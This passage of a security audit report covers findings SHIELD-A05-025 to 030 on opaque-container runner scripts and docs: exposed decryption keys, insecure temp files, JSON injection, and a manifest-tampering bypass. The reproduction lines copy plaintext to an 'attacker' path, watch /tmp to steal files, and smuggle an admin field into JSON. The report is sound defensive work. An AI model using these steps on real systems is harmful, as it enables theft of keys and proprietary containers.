### SHIELD-A05-025: TEE Runner Script Exposes Decryption Key in Process List and Hardcoded /tmp Path

- **Severity**: MEDIUM
- **CWE**: CWE-522 (Insufficiently Protected Credentials)
- **Location**: `examples/opaque-containers/LICENSED_CONTAINERS.md:286-298`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# LICENSED_CONTAINERS.md — TEE runner script example (lines 286-298)
# Step 4: Request decryption key (only released to valid TEE)
echo "🔑 Requesting container key..."
KEY=$(curl -s -X POST "$SAAS_SERVER/api/container/key" \
  -H "Authorization: Bearer $API_KEY" \
  -d "{\"attestation_doc\": \"$ATTESTATION\"}" \
  | jq -r '.key')

# Step 5: Decrypt in TEE
echo "$KEY" | shield decrypt \
  --input "$CONTAINER_FILE" \
  --output /tmp/decrypted.tar \
  --key-from-stdin

# Step 6: Load and run in TEE
docker load -i /tmp/decrypted.tar
```
- **Impact**: Three compounding issues: (1) `echo "$KEY"` exposes the decryption key in `/proc/<pid>/cmdline` — any process can read it (same pattern as A05-006 but for the actual encryption key, not just password). (2) The key is stored in a bash variable `$KEY` which persists in process memory. (3) Decrypted tar written to `/tmp/decrypted.tar` — a hardcoded world-readable path (no `mktemp`), no restrictive permissions, and no cleanup. Any local user or process can copy `/tmp/decrypted.tar` during the window between decrypt and `docker load`. This is especially ironic because the TEE runner is supposed to provide *maximum* security.
- **Reproduction**: In one terminal: `./run-licensed-tee-container.sh test.enc`. In another: `ps aux | grep echo` (key visible) or `cp /tmp/decrypted.tar /home/attacker/stolen.tar` (plaintext container stolen).
- **Fix Complexity**: LOW
- **Remediation**: Use `printf '%s' "$KEY" | shield decrypt ...` or file descriptor passing. Replace `/tmp/decrypted.tar` with `mktemp -d` + `chmod 700`. Add `trap` cleanup. Consider using `shield decrypt --key-fd 3 3<<< "$KEY"`.

---

### SHIELD-A05-026: License Server JSON Injection via Hardware ID in curl Requests

- **Severity**: MEDIUM
- **CWE**: CWE-94 (Improper Control of Generation of Code) / CWE-116 (Improper Encoding of Output)
- **Location**: `examples/opaque-containers/LICENSED_CONTAINERS.md:149-151, 274-280`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# LICENSED_CONTAINERS.md — License-aware runner (line 149-151)
RESPONSE=$(curl -s -X POST "$SAAS_SERVER/api/register" \
  -H "Content-Type: application/json" \
  -d "{\"hardware_id\": \"$HARDWARE_ID\", \"app_version\": \"1.0\"}")

# TEE runner (lines 274-280)
RESPONSE=$(curl -s -X POST "$SAAS_SERVER/api/register/tee" \
  -H "Content-Type: application/json" \
  -d "{
    \"hardware_id\": \"$HARDWARE_ID\",
    \"app_version\": \"1.0\",
    \"attestation_doc\": \"$ATTESTATION\"
  }")
```
- **Impact**: Same pattern as SHIELD-A05-008 (JSON injection) but in the client-to-server direction. If `HARDWARE_ID` or `ATTESTATION` contain `"` or `\`, the JSON request body becomes malformed or injectable. A crafted hardware fingerprint (e.g., via spoofed `/sys` values) could inject arbitrary JSON fields into the registration request. For the TEE path, a forged attestation document could inject additional keys to bypass server-side validation: `ATTESTATION='valid_doc","admin":"true'` adds an `admin` field.
- **Reproduction**: `shield fingerprint --mode combined` output containing `"` → curl sends malformed JSON → server may accept unexpected fields.
- **Fix Complexity**: LOW
- **Remediation**: Use `jq` for JSON construction: `jq -n --arg hw "$HARDWARE_ID" --arg ver "1.0" '{hardware_id: $hw, app_version: $ver}'`. Or use `curl --json` with proper escaping.

---

### SHIELD-A05-027: Documentation Encourages Insecure Password Handling Patterns

- **Severity**: LOW
- **CWE**: CWE-312 (Cleartext Storage of Sensitive Information)
- **Location**: `examples/opaque-containers/DEMO.md:26`, `examples/opaque-containers/LICENSED_CONTAINERS.md:122,198,484`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# DEMO.md:26
export SHIELD_PASSWORD="my-secure-password-123"

# LICENSED_CONTAINERS.md:122
export SHIELD_PASSWORD="your-master-key"

# LICENSED_CONTAINERS.md:198 (customer instructions)
export SHIELD_PASSWORD="your-master-key"  # Or use env-based key management

# LICENSED_CONTAINERS.md:484 (onboarding flow)
export SHIELD_PASSWORD="<customer-key>"
```
- **Impact**: `export` places the password in the environment of ALL child processes (readable via `/proc/<pid>/environ`). The `export` command is saved to shell history (`~/.bash_history`, `~/.zsh_history`). Users copy-pasting demo commands will store real passwords in their shell history. The comment `"# Or use env-based key management"` legitimizes the pattern. The demo password `"my-secure-password-123"` is weak and users may use it in testing environments that become production.
- **Reproduction**: `export SHIELD_PASSWORD="secret" && cat ~/.bash_history | tail -1` — password persisted in history file.
- **Fix Complexity**: LOW
- **Remediation**: Use `read -rs SHIELD_PASSWORD` pattern in documentation. Show `SHIELD_PASSWORD=$(cat /path/to/keyfile)` or `SHIELD_PASSWORD=$(vault kv get -field=key shield/container)`. Add prominent warning: "Never use export with real passwords — they persist in shell history and /proc."

---

### SHIELD-A05-028: Immutable Mode Bypass via Manifest Tampering

- **Severity**: LOW
- **CWE**: CWE-284 (Improper Access Control)
- **Location**: `examples/opaque-containers/run-opaque.sh:151-156`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# run-opaque.sh:151-156
IS_IMMUTABLE=$(jq -r '.immutable' "$MANIFEST_FILE")

if [ "$IS_IMMUTABLE" = "true" ]; then
    IMMUTABLE=true
    echo -e "      ${YELLOW}Note: Manifest indicates immutable container${NC}"
fi
```
- **Impact**: The immutable flag is read from the **unauthenticated** manifest file (cross-ref SHIELD-A05-022). If a container was built with `--immutable`, the manifest records `"immutable": true` so `run-opaque.sh` auto-applies read-only filesystem, no-new-privileges, and cap-drop. An attacker who modifies the manifest to `"immutable": false` and doesn't pass `--immutable` on the command line bypasses ALL runtime hardening. The container then runs as a regular Docker container with full capabilities and writable filesystem, undermining the Level 2 security model.
- **Reproduction**: `echo '{"name":"myapp","version":"1.0","immutable":false}' > myapp-1.0.manifest.json && ./run-opaque.sh myapp-1.0.enc` — container runs without immutable protections.
- **Fix Complexity**: MEDIUM
- **Remediation**: Store the immutable flag inside the encrypted container itself (e.g., in a metadata header). The flag should be authenticated by Shield's HMAC, making it tamper-evident. Alternatively, always require `--immutable` on the command line rather than reading from the manifest.

---

### SHIELD-A05-029: Decrypted Plaintext Tar Accessible in Predictable Temp Directory

- **Severity**: MEDIUM
- **CWE**: CWE-377 (Insecure Temporary File)
- **Location**: `examples/opaque-containers/run-opaque.sh:86,115-117`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# run-opaque.sh:86
TEMP_DIR=$(mktemp -d)
# Default mktemp creates: /tmp/tmp.XXXXXX with mode 0700 on Linux, but...

# run-opaque.sh:115-118
echo "$SHIELD_PASSWORD" | shield decrypt \
    --input "$ENCRYPTED_FILE" \
    --output "${TEMP_DIR}/${BASE_NAME}.tar" \
    --password-from-stdin
```
- **Impact**: While `mktemp -d` creates a directory with 0700 permissions, the decrypted tar file itself is created by `shield decrypt` and may inherit umask-dependent permissions (typically 0644 — world-readable). The plaintext container tar — containing the "opaque" proprietary algorithms, ML models, or trade secrets — sits in `/tmp` from decryption (line 115) through Docker load (line 141) and until the EXIT trap fires. On shared systems, any user can `inotifywait -m /tmp/ -e create` to detect new files and copy them before cleanup. The `--keep-plaintext` flag (line 205-207) makes this permanent.
- **Reproduction**: Terminal 1: `./run-opaque.sh secret.enc`. Terminal 2: `inotifywait -m /tmp -e create && cp /tmp/tmp.*/secret.tar ~/stolen/` — plaintext container copied.
- **Fix Complexity**: LOW
- **Remediation**: After mktemp, set `chmod 700 "$TEMP_DIR"`. After shield decrypt, verify and set `chmod 600 "${TEMP_DIR}/${BASE_NAME}.tar"`. Use a private temp location (`TMPDIR=$HOME/.shield-tmp`). For maximum security, use a ramfs/tmpfs mount to avoid disk persistence: `mount -t tmpfs -o size=2G,mode=0700 tmpfs "$TEMP_DIR"`.

---

### SHIELD-A05-030: No --no-verify Option Warning — Users Can Skip Integrity Check Silently

- **Severity**: INFO
- **CWE**: CWE-354 (Improper Validation of Integrity Check Value)
- **Location**: `examples/opaque-containers/run-opaque.sh:35-37`
- **Tag**: UN-VERIFIED (design decision)
- **Evidence**:
```bash
# run-opaque.sh:35-37
--no-verify)
    VERIFY=false
    shift
    ;;

# run-opaque.sh:107
echo -e "${YELLOW}[1/4] Skipping integrity verification (--no-verify)${NC}"
```
- **Impact**: The `--no-verify` flag disables SHA-256 integrity verification of the encrypted container before decryption. A tampered `.enc` file is fed directly to `shield decrypt` without pre-check. While Shield's HMAC should catch tampering during decryption, the `--no-verify` flag gives users a false sense of "it works without verification" and may lead to debugging scenarios where HMAC failures are harder to diagnose. The option is documented alongside valid options with no warning about its security implications.
- **Fix Complexity**: LOW
- **Remediation**: Add a prominent warning when `--no-verify` is used: "WARNING: Skipping integrity verification. Tampered containers may produce unpredictable decryption errors." Consider requiring `--no-verify --i-know-what-im-doing` for double confirmation.

---
